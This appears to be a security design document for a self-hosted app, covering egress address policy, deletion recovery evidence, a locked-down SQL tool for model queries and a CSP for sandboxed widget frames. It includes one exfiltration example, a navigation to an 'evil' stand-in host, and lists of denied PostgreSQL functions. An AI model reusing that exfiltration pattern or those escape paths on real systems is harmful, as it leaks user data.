# Security, deletion and recovery boundaries

Source baseline: develop `98365a1`, 2026-10-06. P12 deletion/recovery implementation is incomplete. This document specifies recovery evidence and preserves existing owner safeguards; it does not report completed runtime acceptance.

## Access and owner boundaries

Use authenticated owner APIs and the existing CSRF dependency for mutations. A login grant and a data-collection grant are separate authorities. Tool/MCP actions retain their existing grant, approval, idempotency and remote-effect receipts. Source content and tool output are data, not authorization to run instructions. Never log credentials or private response payloads as recovery evidence.

Keep current upload size/archive/PDF, URL/SSRF and provider controls in their owning modules. Their live rejection behavior remains part of deferred acceptance. Internal databases, Docker socket and administrator-managed tool processes are private deployment interfaces; use the supported HTTPS proxy configuration in [deployment.md](deployment.md).

## Transport and network hardening

- **Redis password:** `REDISCLI_AUTH` (container `requirepass`) and the password inside `REDIS_URL` are mandatory. Unless `ENVIRONMENT` is explicitly `dev`, `development` or `test` (`auto` does not relax this), the API and workers refuse to start when `REDIS_URL` has no password or uses a `replace-with-` placeholder. `make setup` / `scripts/dev.ps1 setup` generate both.
- **HSTS:** sent only by the TLS terminator (Caddy: `Strict-Transport-Security: max-age=31536000`). Next.js no longer emits it, so there is a single value; with Cloudflare Tunnel configure HSTS at Cloudflare.
- **Client IP:** uvicorn runs with `--no-proxy-headers` and never reads forwarded headers. A public production origin refuses to start without `AUTH_TRUST_FORWARDED_FOR=true` or `AUTH_CLIENT_IP_HEADER` (otherwise login limit and lockout would be global); failed logins are counted only after Origin and CSRF pass. The per-IP auth limit uses the TCP peer unless `AUTH_TRUST_FORWARDED_FOR=true` (rightmost `X-Forwarded-For`, valid only when the front proxy overwrites it; see deployment.md). Per-session request budgets (`core/rate_limit.py`) key on the session cookie or bearer token first; the address is only a fallback for unauthenticated callers.
- **SSE paths** (`/api/v1/realtime/events`, `/api/v1/responses/{id}/events`) need proxy buffering off, read timeout of at least 75 s and `Last-Event-ID` preserved; see deployment.md.

- **Egress address policy:** every outbound-fetch gate (model gateway, REST/crawl pinning, collection URL validation, MCP transport) uses `core/net_policy.is_public_address`, never bare `ipaddress.is_global` (True on Python 3.12 for NAT64 `64:ff9b::a9fe:a9fe` and IPv4-compatible `::a9fe:a9fe`). IPv4-mapped and well-known NAT64 (`64:ff9b::/96`) are judged by the embedded IPv4; Teredo, 6to4, local-use NAT64, IPv4-compatible, `100::/64`, `fec0::/10`, shared `100.64/10`, multicast, reserved and unspecified are refused. `embedded_ipv4` lets the private-only local-service rule and MCP special-use check reject encoded link-local (metadata) addresses.
- Local-service connectors (`health` FHIR, `home_assistant`) fetch only private/loopback addresses, so they are operator-only: `put_configuration` returns 403 for other accounts and collection refuses with `destination_not_allowed`, preventing a workspace owner from reaching internal services.
- The browser collector serves no `/docs`, `/redoc` or OpenAPI; its healthcheck is a TCP probe. Its IPv6 egress firewall (`docker/browser-entrypoint.sh`) also drops mapped/NAT64/6to4/Teredo ranges; do not enable IPv6 on `browser_egress` without reviewing it.

## Deletion completion

Immediate access revocation, canonical cleanup, raw-file cleanup and external graph convergence are distinct stages. Source generation/tombstone changes deny stale access before asynchronous cleanup. Connector-only removal preserves imported data; with-data removal requires owned derived copies to be cleaned. Shared facts remain when independent retained evidence supports them.

Source canonical cleanup now captures exact per-Document child receipts before cascade and delegates raw cleanup to the Documents owner (`fe601bc`), preserving shared-URI fences and retry identity. Its linked-child progress is separate from complete historical and Source-local copied-owner coverage. Individual Document deletion now records an owner-only durable operation and outbox event before canonical commit, with independent record/graph-tombstone/raw status, exact shared-URI publication fencing and retryable contained unlink (`3d2c51e`). This is accepted code/build/source review, not physical-erasure runtime proof. Bounded Chat copied-evidence cleanup is integrated at `f6da2e2`: immutable version/chunk identities are captured before cascade, cleanup runs without a raw file, structured copies are scrubbed, and current reads/SSE replay/model request opening/publication revalidate exact evidence. Raw, Chat and aggregate copy status remain distinct; Chat success does not mark the aggregate complete. Document deletion receipt UI is integrated (`4416843`); Memory, Agent, Dashboard, Notification and Automation copied owners, historical same-source receipts and Source-local Memory coverage still require P12 implementation. Zero current Documents does not prove all historical copies are erased. A source operation marked successful must not be used as evidence that an external graph is absent. Disabled or unavailable external components cannot establish erasure.

Conversation deletion preserves independent action-effect tombstones and uncertainty. Memory bulk history cleanup now uses the accepted Chat public deletion contract under the Memory privacy lock (`94c7c1b`). Expired Chat worker cleanup is integrated at `32a6ccc`: bounded candidate batches, fresh expiration and identity checks, Memory → Chat → Agent lock order, pinned ephemeral TTL, and persistent-parent retention for run-only expiry. The returned cleanup count includes cascaded stream and mutation-receipt rows. Its prescribed production build and independent source reviews passed; runtime expiry/concurrency acceptance remains deferred. Privacy consent fences are integrated, but consent fencing alone does not close the deletion task.

Already delivered provider/client bytes cannot be recalled. Live deletion does not erase provider-held volume snapshots; snapshot retention and key handling are separate controls owned by the cloud provider.

## Recovery evidence matrix

The following are required deferred checks, not passed checks. Use disposable data and preserve owner volumes; commands must come from the final accepted implementation.

| Failure boundary | Required durable evidence | Required recovery/visibility | Current qualification |
| --- | --- | --- | --- |
| API/worker dies before canonical deletion commit | Transaction absent or rolled back | Existing owner data stays consistent; retry authenticated request with its identity | Runtime pending |
| Worker dies after canonical commit, before raw unlink | Tombstone/generation and exact raw-cleanup intent | Retrieval denied; retry only captured owned file cleanup | Source and individual-Document journals exist; runtime pending |
| Raw cleanup fails or storage is unavailable | Error and pending retry identity without private content | Canonical deletion remains effective; physical cleanup stays pending | Source retry exists; runtime pending |
| Graph dies before/after deletion dispatch | Exact scope, desired/applied revisions and durable worker intent | Resume reconciliation; retain independently supported facts | Existing temporal recovery; cross-stage status integration pending |
| Redis is lost | PostgreSQL intent/event/run and effect receipts | Recreate execution from durable identities, without replaying uncertain remote effects | Runtime pending |
| Agent/automation dies around remote effect | Attempt/result/uncertainty receipt and approval identity | Reconcile requires-review effects; never assume absent response means no effect | Runtime pending |
| SSE reconnects after consent/deletion change | Current consent/evidence fence and terminal event identity | Redact/cancel stale copied payloads; client refetches authorized state | Privacy fences integrated; full deletion redaction pending |

## Release evidence

Record exact source revision, configured capabilities and receipt identities without secrets. Keep failure, pending and uncertain states explicit. Use [release-checklist.md](release-checklist.md), [performance-report.md](performance-report.md) and the execution ledger for final gates. Container builds and source review do not prove service recovery, erasure, target capacity or successful restore.


## Chat SQL tool (`query_collected_data`, mode `sql`)

Model-written SQL is untrusted input. Three independent layers apply, and a failure of one must not expose data:

1. **Parser allowlist** (`modules/chat/sql_guard.py`, `pglast` = PostgreSQL's own grammar). Exactly one `SELECT`; only `scoped_observations` / `scoped_documents` or CTEs defined earlier in the same top-level `WITH`; no schema-qualified names, `WITH RECURSIVE`, `INTO`, locking clauses, set-returning functions, `COLLATE`, `TABLESAMPLE`, parameters or DML. Functions, operators and cast targets come from explicit allowlists (aggregates, window, string/date/math helpers, `->`/`->>`; `now()` is allowed, `current_user`/`set_config`/`query_to_xml`/`lo_*`/`setval`/`pg_*` are not; no `regclass` casts). The length, comment and semicolon checks stay in front of the parser. The former keyword regex was removed rather than kept as a second layer: the parser already rejects everything it guarded and the regex refused legitimate literals such as `ILIKE '%set%'`.
2. **Dedicated login role** (Alembic `0017_chat_sql_login_role`). Model SQL runs on its own small connection pool (`CHAT_SQL_READER_DATABASE_URL`, direct to PostgreSQL, never PgBouncer or the app pool) that logs in as `umwelt_chat_sql_login`: `LOGIN NOSUPERUSER NOINHERIT`, member of no role (in particular not the app role), `default_transaction_read_only=on`, `statement_timeout=2s`, `idle_in_transaction_session_timeout=10s`, connection limit 8, and `SELECT` only on the two permanent `chat_sql.scoped_observations` / `chat_sql.scoped_documents` views (owned by the migration user; `search_path` is `chat_sql, pg_catalog`). `session_user` is the reader, so `SET ROLE`/`RESET ROLE` cannot reach the app role regardless of what SQL runs. The workspace/source fence lives in `chat_sql.query_fence` (Alembic `0018_chat_sql_query_fence`), keyed by the reader's `pg_backend_pid()`. The reader has no privilege on that table; the views join it with owner rights. Per query the executor reads the reader pid, upserts the fence row (validated `UUID`s, 10 s expiry) on a separate short app-role transaction and commits it, then on the reader runs `SET TRANSACTION READ ONLY`, a 2000ms timeout and the model query in a transaction that is always rolled back, and finally deletes the fence row (also on error; the expiry covers a crash). No `umwelt.*` settings are involved. The views return zero rows when no unexpired row exists for the backend. Residual risk: an escape from layer 1 cannot retarget the fence (it cannot write the table or influence the pid); it can read only the current query's own workspace and sources through the two views, never base tables, other schemas or write. A reused backend pid could inherit a not-yet-expired fence of the same application for at most the 10 s expiry (`pg_stat_activity.backend_start` is invisible to the view owner for another role's session, so it cannot pin the session). If `CHAT_SQL_READER_DATABASE_URL` is unset SQL mode is disabled with an error to the model (fail closed; there is no fallback to the app connection). The older `umwelt_chat_sql_reader` role (0013) is no longer used by the tool. The password is never in a migration: `python -m core.chat_sql_provision` (run by the `migrate` service) applies it from the URL as a client-computed SCRAM-SHA-256 verifier (never plaintext SQL; engine uses `hide_parameters`, errors print only exception class and SQLSTATE); rerun it to rotate. Alembic `0019_chat_sql_reader_no_public_writes` removes the reader's remaining write paths, which `default_transaction_read_only` alone does not (a session can `SET TRANSACTION READ WRITE`): PUBLIC's database `TEMPORARY` privilege and PUBLIC `EXECUTE` on the large-object functions (`lo_from_bytea`, `lo_create`, ...), `pg_notify` and the `pg_*advisory*` functions are revoked; temp tables and advisory locks are granted back explicitly to the application (migration/owner) role, and large objects and `pg_notify` are unused by the app. `set_config` is harmless since 0018 and `pg_sleep` is bounded by `statement_timeout`. The `chat_sql` views are `security_barrier`, so user-supplied functions cannot be pushed below the workspace/source predicates.
3. **Transaction rollback** after the rows are fetched discards the reader transaction, so the pooled connection returns clean. The row cap stays 50.

The migration must run as a role allowed to create roles; if the role is missing the tool fails closed (`query_execution_failed`).

## Content-Security-Policy (nonce-based)

The app CSP is emitted only by `apps/web/src/proxy.ts` (builder: `apps/web/src/core/csp.ts`), per request, with a fresh nonce: `script-src 'self' 'nonce-<n>' 'strict-dynamic'` (plus `'unsafe-eval'` in dev only). `next.config.ts` and the Caddyfile deliberately set no CSP (two CSP headers intersect). The root layout reads the nonce (`x-nonce`), tags the accent-init script (the nonce is also passed as a prop to the `QueryProvider` client component, so client code in the app origin can read it; it is per-request and unguessable, not secret from app scripts); this makes every page dynamic. `style-src` keeps `'unsafe-inline'` (React `style` props, Recharts, Radix; styles cannot run script).

Generative-UI widget frames are NOT `srcdoc`/`data:`/`blob:` documents: all three inherit the embedding page's policy container (verified in Chromium; an inline script or `onclick=` is blocked by the host nonce policy even with a permissive `<meta>`), and CSP offers no way to opt out. Each widget iframe instead loads the same-origin shell route `/genui-frame` (`apps/web/src/app/genui-frame/route.ts`, contract in `apps/web/src/core/genui-frame.ts`) with `sandbox="allow-scripts"` (never `allow-same-origin`) and receives its document in the iframe `name` attribute; the shell script writes it into itself (`document.write`) and clears the name. The shell is a real response with its own header CSP and is excluded from `proxy.ts` (matcher) and from the global security headers (it must be framable), so the host nonce never reaches the frame and the app keeps no script `'unsafe-inline'`. Widget inline handlers, `jsFunctions`, `jsExpressions`, import-map libraries and morph/exec-js updates work unchanged.

Final policies. App (`proxy.ts`): `default-src 'self'; script-src 'self' 'nonce-<n>' 'strict-dynamic'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; connect-src 'self'; worker-src 'self' blob:; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'` (dev adds `'unsafe-eval'` and `ws: wss:`). Widget frame origin: the `<origin>` is taken from `PUBLIC_ORIGIN` (`apps/web/src/core/public-origin.ts`, http/https only, normalized with `URL.origin`), never from `request.url` (the Next standalone server sees its bind address, e.g. `http://0.0.0.0:3000`). Only if `PUBLIC_ORIGIN` is unset does it fall back to `X-Forwarded-Proto` + `X-Forwarded-Host`/`Host`, each validated by a strict `hostname[:port]` regex so no `;` or space can inject CSP directives; otherwise the vendor source is omitted. The web container receives `PUBLIC_ORIGIN` from `docker-compose.yml` (and `TEST_PUBLIC_ORIGIN` in the test overlay). The client meta CSP (`buildCspMetaTag`) uses `window.location.origin`, i.e. the origin the browser sees, so it must equal `PUBLIC_ORIGIN` (already required for the API CSRF origin check). Widget frame (`/genui-frame` header, repeated in the document `<meta>`): `default-src 'none'; script-src 'unsafe-inline' <origin>/vendor/genui/; style-src 'unsafe-inline' <origin>/vendor/genui/; img-src data: blob:; font-src data:; connect-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'self'; sandbox allow-scripts` (the meta omits `frame-ancestors` and `sandbox`, which are header-only). The header `sandbox` forces an opaque origin even when the URL is opened top-level, and the shell script writes `window.name` only when `window.top !== window` (otherwise it just clears it), so an attacker page that sets `window.name` and navigates a top-level tab to `/genui-frame` cannot run script in the app origin (e2e: `generative-ui.spec.ts`). The shell also sends `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer` and `Cache-Control: no-store`; no COOP (it would add nothing here and could affect framing). API / static (`next.config.ts` `headers()`, builder `API_FALLBACK_CSP` in `core/csp.ts`): `/api/*` (excluded from the proxy matcher, served by FastAPI via rewrite) gets `default-src 'none'; frame-ancestors 'none'; sandbox`. Verified with `next start` and a stub backend: Next `headers()` are NOT applied to responses proxied through an external rewrite, so the effective layer is FastAPI `ApiDefaultHeadersMiddleware` (`core/api_headers.py`), which adds that CSP and `X-Content-Type-Options: nosniff` to every API response that does not set its own (the `next.config.ts` entry is kept as defence in depth for non-proxied paths); the backend sets its own CSP only on the media route (`default-src 'none'; sandbox`, equal or stricter, so the intersection is unchanged). `/_next/*` static chunks are not documents and get no CSP. Caddy sets none. Residual: the frame still allows `'unsafe-inline'` script because widget code is model-authored and needs inline handlers; it is contained by the opaque origin, `connect-src 'none'`, `default-src 'none'`, and nonce/source-checked `postMessage`. Accepted residual: model-authored widget code can self-navigate the frame (`location.href = 'https://evil/?' + data`); `connect-src 'none'` does not restrict navigation and `navigate-to` does not exist in CSP. It is contained because the widget only holds what the model put into it and has no host cookies or storage (opaque origin). `/genui-frame` is unauthenticated (a sandboxed frame sends no cookies) and serves no user data. Other mitigations: `object-src 'none'`, `base-uri 'self'`, host-side confirmation for widget links and prompts.

## Dependency policy

- `make audit` (`scripts/audit.sh`) runs `npm audit --audit-level=high` (runtime and dev dependencies) and `pip-audit` against the exact production set exported from `uv.lock`. Run it before every release and after any dependency change; a high or critical advisory blocks release.
- Fix by upgrading to the patched version within the declared major range: `npm install <pkg>@<ver>` at the repo root (updates `package-lock.json`; transitive copies may need `npm update <pkg>`), or raise the constraint in `pyproject.toml` and run `uv lock --upgrade-package <pkg>`. Exact-pinned packages (`langgraph*`) must be moved together because `langgraph-checkpoint-postgres` constrains `langgraph-checkpoint`.
- Moderate advisories that only affect development tooling (currently `minimatch` 10.2.6 via `typescript-eslint` -> `typescript-estree`; upstream 8.72.1 still depends on `^10.2.2` and an npm `overrides` pin to minimatch 11 was not honored by npm 11 for this transitive edge, so no fix is applied) are tracked and accepted until upstream ships a fix; they must not ship in the production bundle.
- Last remediation (2026-11-04): next 16.4.5, eslint-config-next 16.4.5, dompurify 3.4.17, zod 4.6.7, undici 8.12.3; authlib 1.9.4, pypdf 6.21.4, certifi 2026.10.23, joserfc 1.8.0, langgraph-checkpoint 4.3.1, langgraph-checkpoint-postgres 3.1.3, langgraph-sdk 0.4.12, opentelemetry-api 1.45.2.
